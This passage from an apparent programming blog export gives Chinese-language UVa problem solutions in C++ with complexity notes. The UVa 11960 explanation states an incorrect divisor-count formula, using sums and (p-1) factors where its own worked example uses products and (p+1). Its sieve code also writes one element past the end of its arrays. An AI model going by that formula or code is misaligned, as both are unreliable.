class="keyword">continue</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">				input+=tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans.count(input))&#123;</span><br><span class="line">			<span class="keyword">if</span>(input==<span class="keyword">final</span>)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">string</span> nxt=input;</span><br><span class="line">				<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">				<span class="built_in">string</span> out;</span><br><span class="line">				<span class="keyword">while</span>(ans[nxt].second!=<span class="string">"end"</span>)&#123;</span><br><span class="line">					out+=ans[nxt].first;</span><br><span class="line">					nxt=ans[nxt].second;</span><br><span class="line">					cnt++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;cnt&lt;&lt;<span class="string">" "</span>&lt;&lt;out&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Not solvable\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>初始化可能盤面時間複雜度 $O(9!)$<br>搜尋使用map時間複雜度為 $O(log{9!})$<br>令$N$表示可能盤面數且 $N=9!$<br>總時間複雜度 $O(N+logN)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>BFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11743</title>
    <url>/2020/07/02/UVa11743/</url>
    <content><![CDATA[<h1 id="UVa11743"><a href="#UVa11743" class="headerlink" title="UVa11743"></a>UVa11743</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11743" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11743</a><br>定義一組合法的信用卡卡號可以透過以下步驟檢查</p>
<ol>
<li>將偶數位置上的數字乘2</li>
<li>將剛剛所得到的數字中每一個位數數值加總</li>
<li>將信用卡號中奇數位數的數字作加總</li>
<li>將步驟2、3兩數相加</li>
<li>判斷個位數是否為0，0為合法卡號，非零為非法卡號</li>
</ol>
<p>給一組信用卡卡號，求是否為合法卡號</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>依據題目給的步驟模擬過一遍即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,tmp,odd,even;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(n)&#123;</span><br><span class="line">		ret+=n%<span class="number">10</span>;</span><br><span class="line">		n/=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		odd=<span class="number">0</span>,even=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			<span class="keyword">bool</span> is_odd=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">				<span class="keyword">if</span>(is_odd)</span><br><span class="line">					odd+=tmp%<span class="number">10</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					even+=add((tmp%<span class="number">10</span>)*<span class="number">2</span>);</span><br><span class="line">				tmp/=<span class="number">10</span>;</span><br><span class="line">				is_odd=!is_odd;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((odd+even)%<span class="number">10</span>!=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Invalid\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Valid\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>將數字 $t$ 的每位數字相加複雜度為 $O(len(t))$<br>而題目中的數字長度固定為16，故複雜度約為 $O(1)$<br>其餘操作皆為 $O(1)$<br>總複雜度 $O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11462</title>
    <url>/2021/03/25/UVa11462/</url>
    <content><![CDATA[<h1 id="UVa-11462"><a href="#UVa-11462" class="headerlink" title="UVa 11462"></a>UVa 11462</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11462" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11462</a></p>
<p>有多筆測試資料，每筆測試資料第一行有一個正整數 $n$，接下來有 $n$ 個數字</p>
<p>這 $n$ 個數字保證都在 $1$ ~ $100$ 之間</p>
<p>請將這些數字排序後輸出</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>最單純的想法就是直接排序後輸出</p>
<p>可以直接使用 C++ STL sort</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, arr[<span class="number">2000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(arr, arr+n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>輸出時間複雜度為 $O(n)$</p>
<p>總時間複雜度約為 $O(2n + nlogn)$</p>
<h2 id="想法-2"><a href="#想法-2" class="headerlink" title="想法 2"></a>想法 2</h2><p>因為已知數字的範圍，而且範圍不大</p>
<p>我們可以直接使用陣列紀錄每個數字出現的次數，再統計過後輸出即可，甚至不需要排序</p>
<h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, arr[<span class="number">2000010</span>], age[<span class="number">110</span>];</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="comment">// 先初始化 age 陣列</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;=<span class="number">100</span> ; i++)&#123;</span><br><span class="line">			age[i]=<span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			<span class="comment">// 統計</span></span><br><span class="line">			age[arr[i]]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=<span class="number">100</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(age[i] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;age[i] ; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">					<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析-1"><a href="#時間複雜度分析-1" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>統計時間複雜度為 $O(n)$</p>
<p>輸出時間複雜度為 $O(n)$</p>
<p>總時間複雜度約為 $O(3n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa116</title>
    <url>/2020/06/23/UVa116/</url>
    <content><![CDATA[<h1 id="UVa116"><a href="#UVa116" class="headerlink" title="UVa116"></a>UVa116</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?116" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?116</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>實作dfs很簡單，但是需要能回朔解<br>這邊想到用陣列去記錄每個點要前往的x座標，而y座標固定是+1，故不紀錄<br>在更新Min_dis要特別注意維護x較小的要在前<br>並且當Min_dis已經為最小值時DFS可以直接return減少遞迴時間</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,n,arr[<span class="number">15</span>][<span class="number">105</span>],Min_dis[<span class="number">15</span>][<span class="number">105</span>],to[<span class="number">15</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> m<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x&gt;=m)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y+<span class="number">1</span>==n)&#123;</span><br><span class="line">		<span class="keyword">return</span> Min_dis[x][y]=arr[x][y];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(Min_dis[x][y]!=<span class="number">2147483647</span>)</span><br><span class="line">		<span class="keyword">return</span> Min_dis[x][y];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> nx=next(x+dir[i]);</span><br><span class="line">		<span class="keyword">int</span> ny=y+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> dis=dfs(nx,ny);</span><br><span class="line">		<span class="keyword">if</span>(dis+arr[x][y]&lt;Min_dis[x][y])&#123;</span><br><span class="line">			Min_dis[x][y]=dis+arr[x][y];</span><br><span class="line">			to[x][y]=nx;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(dis+arr[x][y]==Min_dis[x][y] &amp;&amp; to[x][y]&gt;nx)&#123;</span><br><span class="line">			to[x][y]=nx;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Min_dis[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n)&#123;</span><br><span class="line">		<span class="comment">//input</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">				Min_dis[i][j]=<span class="number">2147483647</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>,tot=<span class="number">2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="keyword">int</span> res=dfs(i,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(res&lt;tot)&#123;</span><br><span class="line">				tot=res;</span><br><span class="line">				ans=i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> start=ans,j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(out)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				out=<span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;start+<span class="number">1</span>;</span><br><span class="line">			start=to[start][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;tot&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每次狀態轉移複雜度為 $O(1)$，總共有$n\times m$ 種狀態<br>總複雜度 $O(nm)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11577</title>
    <url>/2021/03/23/UVa11577/</url>
    <content><![CDATA[<h1 id="UVa-11577"><a href="#UVa-11577" class="headerlink" title="UVa 11577"></a>UVa 11577</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11577" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11577</a></p>
<p>給一個字串，求字串中的所有英文字母轉成小寫後，出現次數最多的有哪些</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用一個陣列 $cnt$ 儲存每個字母出現的次數，將 $cnt$ 中最大的值對應到的字母輸出</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> cnt[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">int</span> n,px;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">			cnt[i]=<span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		getline(<span class="built_in">cin</span>,s);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((s[i]&gt;=<span class="string">'A'</span> &amp;&amp; s[i]&lt;=<span class="string">'Z'</span>) || (s[i]&gt;=<span class="string">'a'</span> &amp;&amp; s[i]&lt;=<span class="string">'z'</span>))&#123;</span><br><span class="line">				px=<span class="built_in">tolower</span>(s[i])-<span class="string">'a'</span>;</span><br><span class="line">				cnt[px]++;</span><br><span class="line">				ans=max(ans, cnt[px]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">26</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cnt[i]==ans)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(<span class="string">'a'</span>+i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資會將整個字串看過一遍，時間複雜度為 $O(len(s))$</p>
<p>輸出的時間複雜度很小，可以直接視為 $O(1)$</p>
<p>每筆測資時間複雜度約為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11879</title>
    <url>/2020/07/02/UVa11879/</url>
    <content><![CDATA[<h1 id="UVa11879"><a href="#UVa11879" class="headerlink" title="UVa11879"></a>UVa11879</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11879" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11879</a><br>給一數字 $N$ $(1 \leq N \leq 10^{100})$<br>求該數字是否為17的倍數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>不必理會題目中給的方式<br>可以直接模擬一次做除法的樣子<br><img src="https://i.imgur.com/YAUvlw8.png" alt=""><br>每次做除法就是加入一個位數，留下跟除數相除的餘數繼續步驟<br>如果做到最後餘數為0，則即為答案<br>數字部分可以用字串儲存</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)</span><br><span class="line">		now=(now*<span class="number">10</span>+(s[i]-<span class="string">'0'</span>))%<span class="number">17</span>;</span><br><span class="line">	<span class="keyword">return</span> now==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s &amp;&amp; s!=<span class="string">"0"</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(solve())</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"1\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>對於每個位數處理的時間複雜度為 $O(1)$<br>總時間複雜度為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11960</title>
    <url>/2021/03/23/UVa11960/</url>
    <content><![CDATA[<h1 id="UVa-11960"><a href="#UVa-11960" class="headerlink" title="UVa 11960"></a>UVa 11960</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11960" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11960</a></p>
<p>多筆測資，每筆測資包含一個正整數 $X$ ，求所有 $&lt;=X$ 的正整數當中，因數個數最多的最大整數為何</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先做質因數分解，並且透過以下的想法可以找出每個數的因數個數</p>
<p>我們可以觀察 $24 = 2^3 * 3$</p>
<p>其中的因數包含了 $1, 2, 3, 4, 6, 8, 12, 24$</p>
<p>觀察一下會發現，這些因數都是由 $2$ 的某個小餘等於 $3$ 的次方乘上 $3$ 的某個小於等於 $1$ 的次方組合而成</p>
<p>也就是說我可以選擇要拿多少 $2$ 以及要拿多少 $3$ ，因數個數為 $(3+1)*(1+1)=8$</p>
<p>所以我們得到若 $X=a^p+b^q+c^r$ ，則 $X$ 的因數個數為 $(p-1)<em>(q-1)</em>(r-1)$</p>
<p>話說回來，利用上述的性質，加上質因數分解，就可以輕鬆求出每個數值的因數個數</p>
<p>而由於題目只需要所有 $&lt;=X$ 的正整數當中，因數個數最多的最大整數，所以我們可以預先處理好所有人的答案</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> fact[MaxN],ans[MaxN];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,x;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!fact[i])&#123;</span><br><span class="line">			fact[i]=i;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=i*i ; j&lt;=MaxN ; j+=i)&#123;</span><br><span class="line">				<span class="keyword">if</span>(!fact[j])&#123;</span><br><span class="line">					fact[j]=i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="comment">// 後面要做乘法，所以預設值為 1</span></span><br><span class="line">		ans[i]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> tmp=i;</span><br><span class="line">		<span class="keyword">while</span>(tmp!=<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">int</span> p=fact[tmp], cnt=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(tmp%p==<span class="number">0</span>)&#123;</span><br><span class="line">				tmp/=fact[tmp];</span><br><span class="line">				cnt++;</span><br><span class="line">			&#125;</span><br><span class="line">			ans[i]*=(cnt+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 預處理答案</span></span><br><span class="line">	<span class="keyword">int</span> n=<span class="number">2</span>,m=ans[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;=MaxN ; i++)&#123;</span><br><span class="line">		<span 